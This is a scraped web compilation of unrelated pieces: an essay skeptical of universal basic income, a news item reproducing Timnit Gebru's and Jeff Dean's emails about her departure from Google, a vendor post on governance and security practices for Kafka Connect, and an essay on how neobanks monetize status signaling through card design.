repository) is one way of tackling them in their own right.</p><p>Let's not get too much into technical details. I have already alluded to the work of <a href="https://twitter.com/AdamTornhill">Adam Tornhill</a> on code analysis in a previous post of mine:</p><figure><a href="https://preslav.me/2020/03/01/use-the-git-history/"><div><p>Use the Git History to Identify Pain Points in Any Project</p><p>Have you heard of Adam Tornhill [https://twitter.com/AdamTornhill]’s work?

            <p><strong>Dec 3, 2020</strong></p>
            
            

<p>Universal basic income (UBI) is an odd duck. Proponents range from futurists to libertarians to social democrats. Why this weird range of people?</p>

<p>There are different versions of UBI, with different motivations. People don’t get how <em>contradictory</em> these are. Libertarians and social democrats might both support a fuzzy idea of “UBI” but they’d never agree on specifics.</p>

<p>I don’t think it matters though. I’m deeply skeptical of these <em>interesting</em> versions of UBI. The only realistic option is another, <em>boring</em> version. Why isn’t it discussed more? The more you think about it, the more of a riddle that is.</p>



<p>A libertarian argument for Universal Basic Income might go something like this:</p>

<blockquote>
  <p>The government is stupid and inefficient. There’s medicare, medicaid, social security, food stamps, “other food stamps” (WIC), welfare, “other welfare” (SSI), and unemployment benefits, each with a bureaucracy. Did you know that each item in a supermarket has been classified as buyable with food stamps or not? (<a href="https://ask.usda.gov/s/article/Are-energy-drinks-eligible-for-purchase-with-Supplemental-Nutrition-Assistance-Program-benefits">Energy drinks are usually OK</a>, <a href="https://www.fns.usda.gov/snap/facts">toothpaste is not</a>.) And there’s a <em>different</em> classification for the “other” food stamps? (No <a href="https://www.fns.usda.gov/wic/wic-food-packages-regulatory-requirements-wic-eligible-foods">spices or drinkable yogurt</a>.) And that if you lose your job you need to provide evidence each month that you spent 80 hours looking for a new one? These expensive programs are often miserable for the people they’re supposed to help. Let’s stop micromanaging people’s lives, cut the fat, and <strong>just give people money</strong>?</p>
</blockquote>

<p>I see the appeal, and if you want to reorganize cash transfers like social security and call them “UBI”, that’s fine with me! But it’s very unlikely UBI can replace medicaid.</p>

<p>To see why, consider schools. Sometimes the government runs them. Sometimes the government merely pays for privately run “charter” schools. Sometimes the government pays for “vouchers” that subsidize a fraction of expensive private school.</p>

<p>Why do things this way? Why not give parents (or kids!?) the money and let them spend it however they want?</p>

<p>The answer is obvious, even if we don’t usually say it explicitly: We don’t trust people and we want to control them. Educating kids is an investment that benefits everyone in the future. If we just gave parents cash, I’m sure many would arrange for a better education than the government does now. But I’m also sure many would spend it on wacky religions schools, or crystal healing seminars, or beer.</p>

<p>To be clear, no real UBI proposals would change funding for schools! But that’s kind of the point. That this is <em>so obviously</em> a bad idea shows two things:</p>

<ol>
  <li>
    <p>It’s sometimes valid to constrain how money is used. We can’t “just give people money” without looking at the details. The question is <em>how much</em> to control to assert in each case.</p>
  </li>
  <li>
    <p>Control isn’t free. Some kids might do better in larger classes with higher-paid teachers. Some might prefer individual tutoring and peer instruction. Some might learn to read at home but need more instruction on math. If parents had flexibility, they could probably use the money more effectively. Restrictions to prevent worst-case outcomes also prevent these gains.</p>
  </li>
</ol>

<p>Again, schools are just a hypothetical. What’s not hypothetical is <em>healthcare</em>. For example, <a href="https://www.wsj.com/articles/a-guaranteed-income-for-every-american-1464969586">Charles Murray</a> suggests rolling all government entitlements and healthcare expenditures together into a grant of $12,000, with no tax increase.</p>

<p>This would never work. Say we stop subsidizing healthcare and just give people money. No matter what you do, some won’t save and won’t buy health insurance. (If you doubt this, you’ve met a different species than I have.) Then, you have this difficult question: When one of these people gets sick and shows up at a hospital, do you let them die?</p>

<p>Intellectually, this is a question I take seriously. Think about it like this: Suppose you can choose to be born into Safeland where everyone is secure but bored, or Dangerland where people have fun but risk getting killed. It’s totally reasonable for someone to choose Dangerland. A tough-love “buy insurance or risk death” policy allows people to optimize for their own <a href="https://dyno-might.github.io/2020/10/19/its-hard-to-use-utility-maximization-to-justify-creating-new-sentient-beings/">utility function</a>.</p>

<p><em>Practically</em>, though, there is no question. Society has decided: It’s not acceptable to let people die, and we need some kind of emergency backstop program. But now we’ve gotten back into the healthcare subsidy business. We’ve also abandoned <em>just giving people money</em>, since any funding for the backstop could have been an unrestricted grant.</p>

<p>To avoid this problem, Murray suggests that $3000 of the $12,000 must be spent on health insurance. This is a compromise on the dream of <em>just giving people money</em>. It also reduces, but doesn’t eliminate the underlying problem. What if people need a treatment that wasn’t included in their insurance? Do you have “death panels” to decide what “essential” procedures need to be included? What happens if these can’t be offered for $3000? (The average person in the US uses <a href="https://www.cms.gov/Research-Statistics-Data-and-Systems/Statistics-Trends-and-Reports/NationalHealthExpendData/NHE-Fact-Sheet">$11,000</a> worth of healthcare.)</p>

<p>If you want to do UBI, it mostly has to come <em>on top</em> of targeted programs. That’s <em>increasing</em> the scope of government, not decreasing it. That might be a good idea, but it’s <em>not</em> the libertarian dream. If that’s what you want, you need a different argument.</p>



<p>Here’s a different argument for basic income.</p>

<blockquote>
  <p>Artificial intelligence is coming, and jobs going extinct. Without action, soon all income will go to the wealthy or to the rare people who work on robots/AIs. But jobs getting automated should be good news! There will be plenty of money. In a sane world, when an AI replaces a truck driver, we’d keep paying them without asking them to come to work. For all of history, people have spent their lives mostly scrambling to survive. It’s time for us to be liberated, to spend our time on art, science, politics, whatever. Let the human spirit soar.”</p>
</blockquote>

<p>I have three responses to this.</p>

<p><strong>First</strong>, there isn’t plenty of money, yet. Giving 256 million adults the average truck driver salary of $67 thousand per year would cost $17 trillion. For reference, that’s 4 times the entire <a href="https://www.cbo.gov/system/files/2020-04/56324-CBO-2019-budget-infographic.pdf">current federal budget</a>:</p>

<p><img src="https://dyno-might.github.io/img/skeptical_ubi/budget_small.png" alt="budget"></p>

<p>It’s almost as large as the entire <em>economy</em> ($21 trillion). Giving everyone $12k per year would cost $3 trillion. That’s more than all benefit programs combined, but not impossible. Suppose we make some difficult cuts, add some new taxes and make it happen. Do we expect anyone who previously had a good job to be content with $12 thousand? I’m sure it’s <em>helpful</em>, but it’s no <em>substitute</em> for a job.</p>

<p><strong>Second</strong>, this isn’t how economic revolutions worked in the past. Everyone knows the story: We moved from farms to manufacturing and services as each sector got automated. Keynes famously predicted 90 years ago that we would soon only need to work 15 hours a week. Why didn’t that happen? He was right that existing jobs would mostly disappear. What he missed was that we’d invent so much new stuff and then decide we couldn’t live without it. Are we <em>really sure</em> this time is different? A counter-response from a UBI fan would be that “every trend continues until it stops”. Previously, there were obvious productive things for people to shift their effort to. Now, that’s not clear. My counter counter-reply is: Are you <em>sure</em>?</p>

<p>Both of these responses boil down to “your argument for UBI is premised on some future that’s not here yet”. If 30 years from now the economy is 50x bigger and all the jobs are gone, these responses are moot.</p>

<p>A <strong>third</strong> response is that this argument for UBI assumes jobs are all about money. Joe and Jill Biden are worth around $10 million. So why is Jill Biden teaching English at Northern Virginia Community College? People get much of their identity and meaning in life from their jobs. We are sort of like border collies: Without a role to play, we go crazy. Most people don’t want a handout, they want to feel that they’ve <em>earned</em> what they have.</p>

<p>To be sure, <em>some</em> people, if their current job was replaced with a UBI, would devote themselves to other passions. (Can anyone doubt that a million rationalist-adjacent blogs would bloom?) But others would get bored and depressed. Don’t believe me? Check out fire Financial Independence / Early Retirement (FIRE) forums. There are tons of people who worked hard, saved money, and retired young. They find that relaxation and “fun” get old quickly. Some people occupy themselves volunteer work or creative projects. For others this doesn’t work and they spiral into depression until they eventually decide to take another job.</p>

<p>Maybe society shouldn’t be like this. I don’t really <em>like</em> this connection between work and value. Maybe social norms just need to adjust. Maybe FIRE folks would love retirement if their friends were also free to hang out in the middle of the day. Perhaps, but I think we also need to prepare for the possibility that this doesn’t work.</p>

<p>Here, a UBI proponent might object. “Well, look! Suppose this jobless world comes as predicted. What then? At least I’m proposing a solution! All you’re doing is claiming the solution won’t work. What would you actually suggest we do? Keeping the current world is not an option.”</p>

<p>I agree. We don’t have a stop button to stop the world shifting under our feet. If jobs really do go obsolete, we’ll have to figure something out. I’d support experimenting with UBI. But I’d suggest we <em>also</em> experimenting with how to make jobs stick around. It’s easy to open a building downtown with a “fake jobs for insecure people” sign, but this probably wouldn’t work. We’d probably need to really believe our jobs are valuable.</p>

<p>(As an aside: How to create jobs that look useful? In a future where AI is so powerful that normal human jobs are gone, shouldn’t we be worried about AI risk? Can we create bottlenecks in processes that have to be filled by humans? How to do this in a way that <em>actually</em> reduces AI risk is a hard problem. For our purposes, all that matters is it seems plausible.)</p>

<p><em>Is</em> the world changing under our feet, though? <em>Are</em> jobs …</p></div></div></div></div></section></div>

If this work is meaningful to you, I invite you to become a subscriber today</em>.</p><p>Last week, a prominent a co-leader of the Ethical Artificial Intelligence team at Google sent an email to her colleagues. Timnit Gebru had been working on a research paper that she hoped to publish, but ran into resistance from her superiors at Google. And so she sent a letter expressing her frustration to the internal listserv Google Brain Women and Allies. </p><p>A few days later, Gebru was fired —&nbsp;Google reportedly found the email “inconsistent with the expectations of a Google manager.” It details the struggles Gebru experienced as a Black leader working on ethics research within the company, and presents a bleak view of the path forward for underrepresented minorities at the company. </p><p>Gebru is well known and respected in the AI ethics community; <a href="https://www.bloomberg.com/news/articles/2020-12-03/google-s-co-head-of-ethical-ai-says-she-was-fired-over-email?sref=ExbtjcSG">here are Shelly Banjo  and Mark Bergen on her background at Bloomberg</a>:</p><blockquote><p>Gebru, an alumni of the Stanford Artificial Intelligence Laboratory, is one of the leading voices in the ethical use of artificial intelligence. She is well-known for her work on a&nbsp;<a href="https://news.mit.edu/2018/study-finds-gender-skin-type-bias-artificial-intelligence-systems-0212" title="MIT">landmark study</a>&nbsp;in 2018 that showed how facial recognition software misidentified dark-skinned women as much as 35% of the time, whereas the technology worked with near precision on white men.</p><p>She has also been an outspoken critic of the lack of diversity and unequal treatment of Black workers at tech companies, particularly at&nbsp;<a href="https://www.bloomberg.com/quote/GOOGL:US" title="Company Overview">Alphabet Inc.</a>’s Google, and said she believed her dismissal was meant to send a message to the rest of Google’s employees not to speak up.</p></blockquote><p>Platformer received the email Gebru sent; she herself did not have access to her account after Google terminated her. It is published in full below. </p><p>Google did not immediately respond to a request for comment. But on Thursday morning, Jeff Dean, the head of Google research, emailed employees with his account of what happened. Dean said Gebru had issued ultimatum and would resign unless certain conditions were met. <strong>Platformer</strong> obtained Dean’s email as well; you can find it below Gebru’s. </p><blockquote><p>Hi friends,</p><p>I had stopped writing here as you may know, after all the micro and macro aggressions and harassments I received after posting my stories here (and then of course it started being moderated).</p><p>Recently however, I was contributing to a document that Katherine and Daphne were writing where they were dismayed by the fact that after all this talk, this org seems to have hired 14% or so women this year. Samy has hired 39% from what I understand but he has zero incentive to do this.</p><p>What I want to say is stop writing your documents because it doesn’t make a difference. The DEI OKRs that we don’t know where they come from (and are never met anyways), the random discussions, the “we need more mentorship” rather than “we need to stop the toxic environments that hinder us from progressing” the constant fighting and education at your cost, they don’t matter. Because there is zero accountability. There is no incentive to hire 39% women: your life gets worse when you start advocating for underrepresented people, you start making the other leaders upset when they don’t want to give you good ratings during calibration. There is no way more documents or more conversations will achieve anything. We just had a Black research all hands with such an emotional show of exasperation. Do you know what happened since? Silencing in the most fundamental way possible.</p><p>Have you ever heard of someone getting “feedback” on a paper through a privileged and confidential document to HR? Does that sound like a standard procedure to you or does it just happen to people like me who are constantly dehumanized?</p><p>Imagine this: You’ve sent a paper for feedback to 30+ researchers, you’re awaiting feedback from PR &amp; Policy who you gave a heads up before you even wrote the work saying “we’re thinking of doing this”, working on a revision plan figuring out how to address different feedback from people, haven’t heard from PR &amp; Policy besides them asking you for updates (in 2 months). A week before you go out on vacation, you see a meeting pop up at 4:30pm PST on your calendar (this popped up at around 2pm). No one would tell you what the meeting was about in advance. Then in that meeting your manager’s manager tells you “it has been decided” that you need to retract this paper by next week, Nov. 27, the week when almost everyone would be out (and a date which has nothing to do with the conference process). You are not worth having any conversations about this, since you are not someone whose humanity (let alone expertise recognized by journalists, governments, scientists, civic organizations such as the electronic frontiers foundation etc) is acknowledged or valued in this company.</p><p>Then, you ask for more information. What specific feedback exists? Who is it coming from? Why now? Why not before? Can you go back and forth with anyone? Can you understand what exactly is problematic and what can be changed?</p><p>And you are told after a while, that your manager can read you a privileged and confidential document and you’re not supposed to even know who contributed to this document, who wrote this feedback, what process was followed or anything. You write a detailed document discussing whatever pieces of feedback you can find, asking for questions and clarifications, and it is completely ignored. And you’re met with, once again, an order to retract the paper with no engagement whatsoever.</p><p>Then you try to engage in a conversation about how this is not acceptable and people start doing the opposite of any sort of self reflection—trying to find scapegoats to blame.</p><p>Silencing marginalized voices like this is the opposite of the NAUWU principles which we discussed. And doing this in the context of “responsible AI” adds so much salt to the wounds. I understand that the only things that mean anything at Google are levels, I’ve seen how my expertise has been completely dismissed. But now there’s an additional layer saying any privileged person can decide that they don’t want your paper out with zero conversation. So you’re blocked from adding your voice to the  research community—your work which you do on top of the other marginalization you face here. </p><p>I’m always amazed at how people can continue to do thing after thing like this and then turn around and ask me for some sort of extra DEI work or input. This happened to me last year. I was in the middle of a potential lawsuit for which Kat Herller and I hired feminist lawyers who threatened to sue Google (which is when they backed off--before that Google lawyers were prepared to throw us under the bus and our leaders were following as instructed) and the next day I get some random “impact award.” Pure gaslighting.</p><p>So if you would like to change things, I suggest focusing on leadership accountability and thinking through what types of pressures can also be applied from the outside. For instance, I believe that the Congressional Black Caucus is the entity that started forcing tech companies to report their diversity numbers. Writing more documents and saying things over and over again will tire you out but no one will listen.</p><p>Timnit </p></blockquote><p>And here is the email that Jeff Dean sent out to Googlers on Thursday morning.</p><blockquote><p>Hi everyone,</p><p>I’m sure many of you have seen that Timnit Gebru is no longer working at Google. This is a difficult moment, especially given the important research topics she was involved in, and how deeply we care about responsible AI research as an org and as a company.</p><p>Because there’s been a lot of speculation and misunderstanding on social media, I wanted to share more context about how this came to pass, and assure you we’re here to support you as you continue the research you’re all engaged in.</p><p>Timnit co-authored a paper with four fellow Googlers as well as some external collaborators that needed to go through our review process (as is the case with all externally submitted papers). We’ve approved dozens of papers that Timnit and/or the other Googlers have authored and then published, but as you know, papers often require changes during the internal review process (or are even deemed unsuitable for submission). Unfortunately, this particular paper was only shared with a day’s notice before its deadline — we require two weeks for this sort of review — and then instead of awaiting reviewer feedback, it was approved for submission and submitted.</p><p>A cross functional team then reviewed the paper as part of our regular process and the authors were informed that it didn’t meet our bar for publication and were given feedback about why. It ignored too much relevant research — for example, it talked about the environmental impact of large models, but disregarded subsequent research showing much greater efficiencies.&nbsp; Similarly, it raised concerns about bias in language models, but didn’t take into account recent research to mitigate these issues. We acknowledge that the authors were extremely disappointed with the decision that Megan and I ultimately made, especially as they’d already submitted the paper.&nbsp;</p><p>Timnit responded with an email requiring that a number of conditions be met in order for her to continue working at Google, including revealing the identities of every person who Megan and I had spoken to and consulted as part of the review of the paper and the exact feedback. Timnit wrote that if we didn’t meet these demands, she would leave Google and work on an end date. We accept and respect her decision to resign from Google.</p><p>Given Timnit's role as a respected researcher and a manager in our Ethical AI team, I feel badly that Timnit has gotten to a place where she feels this way about the work we’re doing. I also feel badly that hundreds of you received an email just this week from Timnit telling you to stop work on critical …</p></blockquote></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>If you’re moving data in and out of Kafka, chances are you’re using Apache Kafka Connect. The strength of the Kafka community means we have a large catalog of available connectors for hundreds of different technologies, helping to accelerate the integration of Kafka with 3rd party systems. </p><h2>Adoption challenges </h2><p>As we often see in the world of open source, Kafka’s wide adoption across the community doesn’t make the technology easier to manage. In fact, it would be fair to say there are a number of challenges and design faults that we need to live to accept for the time being. </p><p>Probably the biggest challenge here is to put good governance measures in place for Kafka Connect, which does two things: </p><ol><li><p> <!-- -->Provides healthy &amp; productive data operations for a faster time-to-integrate</p></li><li><p> <!-- -->Helps you meet IT and data compliance requirements to meet audits and get your projects into production. </p></li></ol><p>The good news is you can work around many of these challenges and provide Kafka as a Service within your organization using DataOps practices. Here we break down some of the biggest areas of compliance you may need to meet these best practices including:</p><ul><li><p> <!-- -->Confidentiality</p></li><li><p> <!-- -->Availability</p></li><li><p> <!-- -->Authorization</p></li><li><p> <!-- -->Authentication</p></li><li><p> <!-- -->Isolation &amp; multi-tenancy</p></li><li><p> <!-- -->Audit Reporting </p></li><li><p> <!-- -->Real-time monitoring</p></li></ul><p>Let’s have a look.</p><h2>Connector isolation for availability</h2><p>Applying good governance to Kafka Connect will require running connectors and pipelines across isolated clusters.&nbsp; This is both to protect availability of data and confidentiality.&nbsp; </p><p>Whilst deploying one connector, you risk others within the cluster restarting and triggering a rebalance, temporarily interrupting the service. This may be particularly painful whilst collecting data from a source with no guaranteed delivery (such as a UDP port).</p><p>Certain types of connectors may also consume heavy disk/memory or compute resources. Here we run the risk of impacting the performance or availability of other connectors housed on the cluster. </p><p>Of course your security policies may also dictate the isolation of connectors across different clusters. So a best practice would be to run them in complete isolation.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/41BWiqu1yM2U0KdBjSThR6/5f1955406b021ee9ba7f65758c4bfd20/lenses.io_kafka_connect_connector_isolation__1_.png" alt="lenses.io Apach kafka connect connector isolation "></p><h2>ACL Management for authorization</h2><p>ACL policies allow you to authorize principles (in the form of clients) to Kafka resources, including topics. They're an absolute must.</p><p>The question is how can ACLs themselves be managed and who should have the ability to operate them?</p><p>Here there is a significant gap in native Kafka.</p><p>If you're not already using something like Ranger to manage your ACLs, they can be operated and through Lenses and secured with RBAC and auditing.</p><h2>Assigning privileges with RBAC</h2><p>Service disruption can occur through a malicious or hapless user action.&nbsp; A user could interrupt a flow by compromising one connector, or leak data by deploying another connector.&nbsp; </p><p>Privileges to operate connectors should be assigned, not assumed. Kafka Connect doesn’t provide any role-based security or auditing. </p><p>You could control what connectors are deployed as part of your CI/CD workflows, but this isn’t always the best way of managing connectors since users require constant feedback loops and error handling when deploying them. </p><p>At Lenses we’ve built a security model over Kafka Connect. It’s the same model that provides data access to relevant users.</p><p>At its most basic, you can assign permissions to operate Kafka Connect.</p><p>Then, based on topic namespaces users may be entitled to perform certain actions on a topic level. The available operations extend beyond data access and assign the ability to manage connectors with the topic as the source or sink. </p><p>For example, if you are assigned to the *metrics* namespace only you can only view, create and operate connectors that source or sink on these topics.</p><p>If you were try creating a new connector consuming from <i>crm_customers</i>, the Lenses security model would identify that you are not entitled to that topic and prevent the connector from being deployed. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/6q7ldslrB4Cre91aPzHC5i/3c16c68c63a56b082551cb58fc2b005d/security_namespace_RBAC_kafka_connect__1_.png" alt="security namespace RBAC Apache kafka connect "></p><h2>Authentication with SSO</h2><p>Good management of identities is a security 101. </p><p>This ensures strong use (and rotation) of passwords, two-factor authentication and provides security teams with a centralized real-time monitoring of authentication event logs. </p><p>Chances are your organization has standardized on an Access Management &amp; SSO solution and requires all business applications to integrate with it.</p><p>For Lenses, the same RBAC model mentioned above can authenticate users through your SSO provider including support for Azure, OneLogin, Okta and Keycloak. </p><p>Access audits are logged and can be integrated with your real-time security investigation &amp; user behavior monitoring tools such as Splunk. </p><h2>Multi-Tenant management</h2><p>
If you’re managing multiple Connect clusters, there will be times when you should assign privileges to the clusters, not just the connectors or Kafka resources they access. </p><p>Let's say you can deploy the Elasticsearch connector for topics dev* but only on certain dev* clusters (as opposed to in production).</p><p>Neither Kafka Connect nor open source tooling support managing privileges across different Kafka Connect clusters.</p><p>With Lenses, we’ve recently extended the security model and introduced Kafka Connect namespaces. In the same framework that manages access to data and connectors now comes the ability to define how they are accessed, and what or who accesses them.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/5wo9H1TswETcsItVZybv4J/5cdbd832eefc04c739e7ce6d6742fb63/application_permissions_for_kafka_connect.png" alt="application permissions for kafka connect"></p><h2>Secret Management</h2><p>Avoiding secrets being exposed in code &amp; configuration can be especially tricky, and unless you use a Secret Provider plugin it will expose sensitive configurations via Kafka Connect's APIs.</p><p>Lenses allows you to delegate lookup of secrets, at runtime, to external secret providers such as Hashicorp Vault, AWS Secrets Manager and <a href="https://lenses.io/blog/2020/05/securing-kafka-connect-azure-keyvault/">Azure KeyVault</a> using a plugin. These are open source, Apache 2.0 licensed. Lenses can also act as a secret provider to reduce your tech stack further.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/4aZgjhbqIrHpFoOI8ce2F/6122889cc32f97e29f820ee3c522ace5/kafka_connect_connector_configuration.png" alt="kafka connect connector configuration"></p><h2>Confidentiality through Data Masking</h2><p>
Encrypting and anonymizing data streams is a common and complex challenge with Kafka and often businesses need to re-architect their applications to accommodate for this.&nbsp; </p><p>There are plenty of arguments for encrypting or hashing data in transit or at source, but this may be a compliance requirement you need to fulfil in any case. </p><p>There are also times when data does not need to be encrypted or anonymized on the wire but certain fields should be masked for non-privileged users (such as IT Operators, developers etc.) This is particularly true for investigation or exploration of data.</p><p><a href="https://lenses.io/blog/2020/07/data-dump-real-time-data-catalog-apache-kafka/">Data Policies</a> allow fields across datasets to be masked based on defined rules. This does so without affecting the integrity of the data streams.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/7G4vuR8IiuQSOi1482KsCV/4b8424332d34f7dd3b65df73fc77c0d6/data_masking__1_.png" alt="Lenses.io - Data masking for Apache Kafka"></p><h2>Audit Reporting</h2><p>
Whatever controls are put in place, you should still expect and anticipate audit reports. You may be asked to report on which teams and users are processing certain datasets for example. Data catalogs provide a great way of discovering datasets that exist across an environment.</p><p>If using Lenses, the Data Catalog intelligently discovers metadata in real-time generated by your applications, making those audits much faster.</p><p>The combination of data masking and <a href="https://lenses.io/blog/2020/12/life-of-pii-data-masking-and-compliance-for-apache-kafka/">Data Policies</a> also chip in to help during audits. The same rules that mask data can also detect and list those applications processing the relevant data. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/3XVj5KeEz1NMrnqCOs3YWB/c2b465288b69a848515ec0eaeb0caa08/detected_flows_kafka_connect.png" alt="detected flows kafka connect"></p><p>Not forgetting a <a href="https://lenses.io/blog/2020/08/introducing-kafka-app-catalog/">Topology view</a> which helps to address data lineage and data provenance questions.&nbsp;</p><h2>Real-time security &amp; user behavior monitoring</h2><p>
Getting production sign-off for critical projects may require having real-time security monitoring in place. </p><p>You can expect security operations teams to request audit logs for user behavior monitoring which can detect abnormal activity and insider threats. </p><p>OS level audit logs from your Kafka Connect infrastructure are a big requirement to cover and there are plenty of well-documented security logging solutions for this.</p><p>For application-level audits of Kafka Connect, however, things can prove more difficult.</p><p>With Lenses, we've made sure data operations leave an audit trail. Actions such as restarting a connector or changing configuration. </p><p>Audits can then be fired off into a SIEM or User Behavior solution with native integration into Splunk, or by using a webhook for other solutions. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/6GtVA7QJZdcGGug7ZprCPT/f5bcfb6734d2ed1d3fed0d94e1913a03/connectors_audit_log__1_.png" alt="audit logs for Apache kafka connect connectors"></p><h2>Next steps</h2><p>Many think of governance for Kafka Connect too late. 
</p><p>Getting on the front foot will put you in the good books with security and compliance. It will also avoid an audit that puts you in the eye of a massive storm.

Explore deploying connectors through Lenses in an all-in-one Kafka &amp; Kafka Connect environment available as a <a href="https://lenses.io/box/">Docker Container</a> or as a <a href="https://portal.lenses.io/register?version=demo">Cloud sandbox</a>.

<h3>How Neobanks Should Monetize Status Signaling</h3>



<p><span>01</span> Intro</p>



<p>If you’ve been following this blog for a while, you probably know by now that one of my favorite topics to think and write about is “status signaling”.</p>



<p>Signaling explains most of our everyday actions: what clothes we wear, which universities we pick and which religion we subscribe to. Everything has a hidden signaling component with which we communicate our desired tribal affiliation.</p>



<p>In <a href="http://julian.digital/2020/03/28/signaling-as-a-service/">Signaling-as-a-Service</a>, I described the implications signaling has on the monetization of software businesses. For many traditional industries, monetizing the display of status is not a new concept. A Rolex watch, for example, is not better at telling the time than a cheap Casio watch. But a Rolex reveals something about its owners’ wealth and, thus, their status in society. It’s that status message that explains the difference in price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/equaltime.png"></p><p>Similarly, driving a Prius says something about your views on climate change. A <em>Make America Great Again</em> cap reveals something about your political affiliations. And Nike athletic wear signals a healthy, pro-active lifestyle.</p>



<p>Software is at a crucial disadvantage compared to these physical products because of its intangibility. A fitness app also signals a healthy, pro-active lifestyle, but no one can see it because it only lives on your phone. Everyone can see your Nike gear whenever you wear it in public. Software can’t offer the same benefit. It doesn’t have a signaling distribution channel.</p>



<p>This is why there is no software equivalent of a Rolex watch or a Louis Vuitton handbag. People aren’t willing to spend money on things other people can’t see they spent money on.</p>



<p>But it doesn’t have to be that way. As software is eating the world, the lines between physical and digital products are becoming increasingly blurry. As I have pointed out in my original essay, one way for software companies to solve the signaling distribution problem is to add a physical element to their software product.</p>



<p>In this post I want to explore this idea a little bit further. Specifically, we’ll look at neobanks – and their opportunity to monetize credit card signaling.</p>



<p><span>02</span> Neobanks</p>



<p>In the last couple of years we have witnessed the birth and rise of a new startup vertical: neobanks.</p>



<p>Neobanks differ from traditional banks in two ways:</p>



<p>1) Rather than relying on a physical branch network, the entire banking experience is managed via an app</p>



<p>2) Instead of the <a href="https://www.youtube.com/watch?v=C-q4bEULG64">“how do you do, fellow kids”</a>-cringiness that ad campaigns of traditional banks usually invoke when they try to appeal to a younger audience, neobanks are actually perceived as cool. In fact, many of them feel more like lifestyle brands than banks or tech companies.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/1_26qGBSGmB3yaPD7nZJrFIg.gif">



<img src="https://julian.digital/wp-content/uploads/2020/12/lifestylebrand-1.png"></p><p>Interestingly though, neobanks still use one very traditional banking element: physical cards.</p>



<p>At first glance, this might seem counterintuitive. If you are building a mobile-first bank, why not offer virtual cards and let users pay with their phone? Why go through the hassle of producing and shipping physical cards?</p>



<p>The answer is – you guessed it – signaling.</p>



<p>Think about it: Paying for things (offline) is a social activity. It’s an interaction between at least you and a cashier or waiter. But ideally, in a dinner scenario for example, you are surrounded by other people you want to impress: a date, a group of friends, or work colleagues.</p>



<p>This makes the moment you take out your card to pay the bill a great opportunity to make a statement and build social capital.</p>



<p>If you look at neobanks out there today, it’s pretty obvious that signaling is in fact one of the main benefits they offer – and almost the only thing they monetize <span>(apart from interchange, of course)</span>:</p>



<ul><li>The premium subscriptions neobanks offer usually don’t win on features but solely on nicer looking cards. The <a href="https://n26.com/metal">N26</a> or <a href="https://revolut.com/metal">Revolut</a> Metal plans, for example, don’t offer any additional features that <em>really</em> justify the ~€15 / month price tag. They do include a nice looking metal card though – that’s what people pay for.</li><li>Relatedly, it seems like most of the innovation in the industry is happening in card design. The actual banking products are more or less interchangeable, what differs is whether the card comes in <a href="https://www.apple.com/apple-card/">titanium</a>, <a href="https://www.treecard.org/">wood</a>, or <a href="https://twitter.com/cashapp/status/1290694734529400832">glow-in-the-dark yellow</a>.</li><li>You may have noticed that the credit card number has moved from the front to the back of the card. This makes it easier for users to share photos of their cards on social media as an additional signaling distribution channel.</li></ul>



<p><img src="https://julian.digital/wp-content/uploads/2020/11/nocardnumber-1.png"></p><p>Neobanks are popping up like mushrooms after the rain at the moment and it’s unlikely that this trend will end any time soon. Thanks to banking-as-a-service providers, we’ll likely see a lot of non-banking-companies add banking functionalities and cards to their product offering.</p>



<p>There’s an old Twitter joke that every app evolves until it eventually becomes a chat app. The 2020 version of that joke is that every app evolves until it eventually becomes a bank.</p>



<p>When <a href="https://twitter.com/lehrjulian/status/1295024066869567488">I did some research on credit card designs</a> recently, I was surprised by the sheer amount of different neobanks already in existance. And yet, even though almost all of them offer well-designed cards, it’s shocking how similar they all are. It seems like all of them are focusing on the same target audience instead of differentiating their signaling messages.</p>



<p>Let me explain.</p>



<p><span>03</span> In-Groups, Out-Groups and Artificial Scarcity</p>



<p>In every signaling scenario there are two possible target audiences: An in-group and an out-group.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/groups.png"></p><p>The in-group is the tribe you want to join and signal your affiliation to. The out-group is everyone else – people you want to distance yourself from.</p>



<p><a href="https://www.fastcompany.com/90391587/why-we-dont-want-you-and-your-android-green-bubbles-in-our-imessage-chat">iMessage is a great illustration of this</a>: the chat bubble colors clearly indicate who belongs to the in-group (blue = iOS) and who is part of the out-group (green = Android). </p>



<p>It’s important to note that signaling in iMessage is limited to the in-group since these color codes are only visible for iOS users – Android users can’t see who in the group is using which operating system. </p>



<p>Signaling, however, grows stronger the larger the out-group is – as long as the out-group knows about the in-group. This is why luxury car manufacturers deliberately extend their advertising campaigns to people who will never be able to afford their cars: they are increasing the size of the out-group by educating people about the in-group.</p>



<p>At the same time, brands need to control the size of the in-group. The more exclusive the in-group, the higher the signaling strength and, thus, the monetization potential of a customer. </p>



<p>The easiest control mechanism for the size of the in-group is price. If you set the price high enough, few people will be able to afford the product. Ironically, this, in turn, justifies the high price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/priceloop.png"></p><p>Alternatively, companies create artificial scarcity by setting a hard number on supply. Limited supply creates FOMO and hype which increases the size of the out-group and results in higher social status for members of the in-group. Artificial scarcity explains the price of Bitcoin, Pokémon trading cards and why people spend hours queuing in front of Supreme shops.</p>



<p>The problem with keeping the in-group small is that it also limits the number of potential customers and, thus, overall revenue potential. Companies need to walk a fine line between maximizing the number of customers while simultaneously maximizing the number of people they can (afford to) exclude.</p>



<p><span>04</span> What Neobanks Should Build</p>



<p>The problem with neobanks today is that they all focus on the same in-group. Here are the premium cards of some of the largest European challenger banks – notice any difference?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/metalcards.png"></p><p>It seems like everyone is trying to become the Apple of Banking – including <a href="https://www.apple.com/apple-card/">Apple itself</a>. The signaling messages are all about displaying economic power.</p>



